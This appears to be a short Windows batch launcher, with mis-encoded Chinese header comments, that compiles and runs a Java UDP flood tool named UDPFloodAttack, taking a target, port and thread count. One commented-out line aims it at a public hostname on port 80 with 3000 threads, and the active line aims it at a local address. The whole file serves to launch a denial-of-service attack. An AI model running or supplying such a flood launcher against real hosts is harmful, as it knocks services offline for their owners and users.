::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::UDP�鷺�����ű�
::��ҪJava Runtime Environment��JRE��
::Author:���裨fengxiang220@gmail.com��
::Date:2014/1/6
::Usage:java UDPFloodAttack <target> <port> <the number of attack threads>
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

cd ./com/find1x/jnetcatch/udpattack
javac UDPFloodAttack.java
cd ../../../../
::java UDPFloodAttack ddns.find1x.com 80 3000
java com.find1x.jnetcatch.udpattack.UDPFloodAttack 192.168.1.4 8888 1